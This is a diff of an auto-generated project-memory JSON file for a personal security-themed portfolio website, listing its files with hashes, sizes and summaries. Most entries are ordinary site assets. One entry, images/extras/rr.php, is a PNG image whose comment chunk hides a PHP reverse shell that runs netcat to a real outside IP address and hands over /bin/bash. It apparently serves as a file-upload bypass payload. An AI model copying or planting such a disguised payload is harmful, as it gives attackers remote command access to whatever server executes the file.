@@ -18,16 +18,17 @@
   },
   "structure": {
     "rootFolders": [
-      "irainsec.github.io-main"
+      "css",
+      "images",
+      "irainsec.github.io-main",
+      "js"
     ],
     "mainEntryPoints": [
-      "irainsec.github.io-main/birthday/README.md",
-      "irainsec.github.io-main/README.md",
-      "irainsec.github.io-main/birthday/script/main.js",
-      "irainsec.github.io-main/js/main.js"
+      "README.md",
+      "js/main.js"
     ],
-    "totalFiles": 31,
-    "analyzedFiles": 30
+    "totalFiles": 27,
+    "analyzedFiles": 26
   },
   "dependencies": {
     "production": {},
@@ -87,9 +88,9 @@
       "path": ".vscode/context-optimizer/memory.json",
       "priority": "low",
       "summary": "  \"project\": {     \"name\": \"Ayush Portfolio\",     \"description\": \"\",",
-      "lastAnalyzed": "2026-09-07T14:51:48.480Z",
-      "hash": "e2dfb97d2b5282a0c20f17c06b5e367663f8a7852fb45576e5d8a1348f00eb9e",
-      "size": 1249,
+      "lastAnalyzed": "2026-09-07T22:32:55.435Z",
+      "hash": "ca6449cecf04db0209e08a02d45984a41c1a5cf37cd15f450ad16e4304494d85",
+      "size": 24332,
       "language": "JSON"
     },
     {
@@ -325,6 +326,231 @@
       "hash": "927e30f8b91e4f123de2d20c7107dae9af9bdadd3dcd107d3d96c1017e0d0442",
       "size": 44,
       "language": "JSON"
+    },
+    {
+      "path": "README.md",
+      "priority": "critical",
+      "summary": "README: . personal portfolio <3. Sections: ",
+      "lastAnalyzed": "2026-09-07T22:27:35.597Z",
+      "hash": "21d53091881f372fd42bfdf7823a42e7d1d73ba9f4f5d2a5644c67bc6c8f6ea8",
+      "size": 22,
+      "language": "Markdown"
+    },
+    {
+      "path": "js/main.js",
+      "priority": "high",
+      "summary": "(function($) {     $(document).ready(function() {         // Toggle the menu on button click",
+      "lastAnalyzed": "2026-09-07T22:27:36.637Z",
+      "hash": "31982a932523cd48713cb8d3312c656de4a87c38c8c219d6907d4f53d420222b",
+      "size": 1108,
+      "language": "JavaScript"
+    },
+    {
+      "path": ".vscode/launch.json",
+      "priority": "low",
+      "summary": "    // Use IntelliSense to learn about possible attributes.     // Hover to view descriptions of existing attributes.     // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387",
+      "lastAnalyzed": "2026-09-07T22:27:36.656Z",
+      "hash": "0f91689ffafec3ee55ff3ea07aee0d96b797c71692439f16ace652504bc1df26",
+      "size": 463,
+      "language": "JSON"
+    },
+    {
+      "path": "about.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>\r     <meta charset=\"UTF-8\">\r     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:36.658Z",
+      "hash": "923722959fcd7a4ce7d48ddcbd2b6abd89d3b002e2566684f8a189c3b2f8f0a2",
+      "size": 22161,
+      "language": "HTML"
+    },
+    {
+      "path": "batchfile.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>\r     <meta charset=\"UTF-8\">\r     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:36.668Z",
+      "hash": "6a5dfa09e1feebd06407caa87a90d88db941229aae72e930983dea2478d70900",
+      "size": 8630,
+      "language": "HTML"
+    },
+    {
+      "path": "blogs.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>\r     <meta charset=\"UTF-8\">\r     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:36.683Z",
+      "hash": "4e44939928e012de6145543062e47eaa70e7eae80e703ebe6c96a7c375fb6361",
+      "size": 12565,
+      "language": "HTML"
+    },
+    {
+      "path": "certifications.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html>\r <html lang=\"en\">\r     <meta charset=\"UTF-8\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:36.694Z",
+      "hash": "dc59d0517396341c519f579d2fedaa5efb3d7c80281ddf4d4d117abdbf3db583",
+      "size": 15513,
+      "language": "HTML"
+    },
+    {
+      "path": "contact.html",
+      "priority": "low",
+      "summary": "Functions: sendEmail",
+      "lastAnalyzed": "2026-09-07T22:27:36.705Z",
+      "hash": "7be1147b8fe5566531d653c8f98119bb7805151146f4a12c78740829f335d647",
+      "size": 8776,
+      "language": "HTML"
+    },
+    {
+      "path": "css/aos.css",
+      "priority": "low",
+      "summary": "[data-aos][data-aos][data-aos-duration=\"50\"],body[data-aos-duration=\"50\"] [data-aos]{transition-duration:50ms}[data-aos][data-aos][data-aos-delay=\"50\"],body[data-aos-delay=\"50\"] [data-aos]{transition-",
+      "lastAnalyzed": "2026-09-07T22:27:36.716Z",
+      "hash": "1aa8845fd06e475aefe733d4e55b36a92fcd487975049c8172341827ac9cc03e",
+      "size": 26053,
+      "language": "CSS"
+    },
+    {
+      "path": "css/bootstrap.min.css",
+      "priority": "low",
+      "summary": "@charset \"UTF-8\";/*!  * Bootstrap v5.0.2 (https://getbootstrap.com/)  * Copyright 2011-2021 The Bootstrap Authors",
+      "lastAnalyzed": "2026-09-07T22:27:36.743Z",
+      "hash": "bbf654e6433dcb5a31034bf9831fbd434644102751a60ff683fd4f8246c12c2a",
+      "size": 155800,
+      "language": "CSS"
+    },
+    {
+      "path": "css/iconoir.css",
+      "priority": "low",
+      "summary": "Oversized file (2.09 MB). Full analysis skipped to save token context.",
+      "lastAnalyzed": "2026-09-07T22:27:36.752Z",
+      "hash": "oversized_2192814_1788774792870.3193",
+      "size": 2192814,
+      "language": "CSS"
+    },
+    {
+      "path": "css/style.css",
+      "priority": "low",
+      "summary": "    -- Table of Content --     * # Preloader     * # InfoBox",
+      "lastAnalyzed": "2026-09-07T22:27:36.755Z",
+      "hash": "436d8f4d46635db17d96e664d87532eb1be1825022c458c38789b7e19b36532a",
+      "size": 51816,
+      "language": "CSS"
+    },
+    {
+      "path": "htb.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>\r     <meta charset=\"UTF-8\">\r     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:36.761Z",
+      "hash": "b5c5676d5bcce7a63a13199b7a07d60682b48b496559a491b0d5cb0cd1412b40",
+      "size": 11095,
+      "language": "HTML"
+    },
+    {
+      "path": "images/extras/rr.php",
+      "priority": "low",
+      "summary": "\u0000\u0000\u0000\rIHDR\u0000\u0000\u0001�\u0000\u0000\u0001�\b\u0006\u0000\u0000\u0000���2\u0000\u0000\u0000\u0001sRGB\u0000��\u001c�\u0000\u0000\u0000>tEXtComment\u0000<?php system(\"nc 194.195.114.92 443 -e /bin/bash\"); ?>�ʿ\u0000\u0000 \u0000IDATx^�}\u0007|\u0015e����;�%77�TH\bI\u0000�XPT\u0010Q\u0014Ŷ�]{]\u000b�������wW׶bo+���`�7\u0011\u0004B\t\u0012H �'���3�w����|����\u001f��",
+      "lastAnalyzed": "2026-09-07T22:27:36.782Z",
+      "hash": "92299d365a15832ad7aba7b41d2c5eafb4008ed67098ef0ab3da6af57a123e55",
+      "size": 283355,
+      "language": "PHP"
+    },
+    {
+      "path": "index.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html>\r <html lang=\"en\">\r     <meta charset=\"UTF-8\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:36.787Z",
+      "hash": "2ca43915493ceb087240bb11c39c1b84fe67fe32c02d0b2c3b9b775c30dff934",
+      "size": 17420,
+      "language": "HTML"
+    },
+    {
+      "path": "js/aos.js",
+      "priority": "low",
+      "summary": "!function(e,t){\"object\"==typeof exports&&\"object\"==typeof module?module.exports=t():\"function\"==typeof define&&define.amd?define([],t):\"object\"==typeof exports?exports.AOS=t():e.AOS=t()}(this,(functio",
+      "lastAnalyzed": "2026-09-07T22:27:36.860Z",
+      "hash": "6c84f6c16d74ecf3e7f9e24bc0539ce5028c99a1ff457edc8f2f193563e2e7e5",
+      "size": 13988,
+      "language": "JavaScript"
+    },
+    {
+      "path": "js/bootstrap.bundle.min.js",
+      "priority": "low",
+      "summary": "  * Bootstrap v5.0.2 (https://getbootstrap.com/)   * Copyright 2011-2021 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)   * Licensed under MIT (https://github.com/twbs/b",
+      "lastAnalyzed": "2026-09-07T22:27:37.003Z",
+      "hash": "7fac5bb2420cbd11cd7f980e94e669d7561e23d1fd68f275e784f6b7376d4bad",
+      "size": 78917,
+      "language": "JavaScript"
+    },
+    {
+      "path": "js/jquery-3.6.4.js",
+      "priority": "low",
+      "summary": "Functions: DOMEval, toType, isArrayLike, Sizzle, createCache, cache, markFunction, assert, addHandle, siblingCheck, createInputPseudo, createButtonPseudo +73 more",
+      "lastAnalyzed": "2026-09-07T22:27:37.248Z",
+      "hash": "c50c7a548143b41194f9a74f9d569fb3dc3a67ad345a2f484bb35b3d55bff2d6",
+      "size": 293184,
+      "language": "JavaScript"
+    },
+    {
+      "path": "nav_update.py",
+      "priority": "low",
+      "summary": "import glob html_files = glob.glob('D:/Ayush Portfolio/irainsec.github.io-main/*.html') nav_items = [",
+      "lastAnalyzed": "2026-09-07T22:27:37.263Z",
+      "hash": "19b0ea020286c5aacda322c68d1ad9123e6625fa6b01a3b4a8a9d9a1049236b2",
+      "size": 1630,
+      "language": "Python"
+    },
+    {
+      "path": "reports.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>\r     <meta charset=\"UTF-8\">\r     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:37.280Z",
+      "hash": "8e4015e8a22d15336bc3239c6d6ca83a2990953d70880092b5bd9ad6bff45324",
+      "size": 11093,
+      "language": "HTML"
+    },
+    {
+      "path": "thm.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html><html lang=\"en\"><head>\r     <meta charset=\"UTF-8\">\r     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:37.308Z",
+      "hash": "fa64483089dc969b9f3d3a63f032f9533b681810f0c5d670db1a9e5eba2b6b28",
+      "size": 11095,
+      "language": "HTML"
+    },
+    {
+      "path": "update_about_projects.py",
+      "priority": "low",
+      "summary": "Functions: update_about",
+      "lastAnalyzed": "2026-09-07T22:27:37.322Z",
+      "hash": "f8058c909c126e5a8f8bc847f27477764026d76be8dcf24918cccacb55237f43",
+      "size": 4481,
+      "language": "Python"
+    },
+    {
+      "path": "update_works.py",
+      "priority": "low",
+      "summary": "Functions: update_works",
+      "lastAnalyzed": "2026-09-07T22:27:37.340Z",
+      "hash": "c3e7810bcb60b0242ca963eee29ae927addae89751b0ceb20ad28b58a77bd9b1",
+      "size": 12396,
+      "language": "Python"
+    },
+    {
+      "path": "works.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html>\r <html lang=\"en\">\r     <meta charset=\"UTF-8\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:37.351Z",
+      "hash": "9d93df8346b6d0747503d3eb72cb7d150d679ae7fda90bbc04186b8396cbdd4a",
+      "size": 18610,
+      "language": "HTML"
+    },
+    {
+      "path": "youtube.html",
+      "priority": "low",
+      "summary": "<!DOCTYPE html>\r <html lang=\"en\">\r     <meta charset=\"UTF-8\">\r",
+      "lastAnalyzed": "2026-09-07T22:27:37.360Z",
+      "hash": "7b713f5edf0ed2d4e55a3b538fc16d14300a74ec876f847011fe6243d6100bbc",
+      "size": 12373,
+      "language": "HTML"
     }
   ],
   "features": {
@@ -340,20 +566,33 @@
   },
   "architecture": {
     "summary": "",
-    "decisions": [],
+    "decisions": [
+      "Remove Ayush resume"
+    ],
     "patterns": []
   },
-  "conversations": [],
+  "conversations": [
+    {
+      "date": "2026-09-07T22:32:55.304Z",
+      "type": "decision",
+      "content": "Git commit: Remove Ayush resume"
+    },
+    {
+      "date": "2026-09-07T22:27:35.520Z",
+      "type": "note",
+      "content": "Git commit: Deploy Ayush Kumar Ray portfolio"
+    }
+  ],
   "rules": [],
   "developerNotes": [],
   "meta": {
-    "lastUpdated": "2026-09-07T22:13:33.342Z",
+    "lastUpdated": "2026-09-07T22:32:55.435Z",
     "version": "1.0.0",
     "workspaceRoot": "d:\\Ayush Portfolio",
     "tokenEstimate": {
-      "original": 1059,
-      "compressed": 187,
-      "savedPercent": 82.3
+      "original": 1866,
+      "compressed": 236,
+      "savedPercent": 87.4
     }
   }
 }
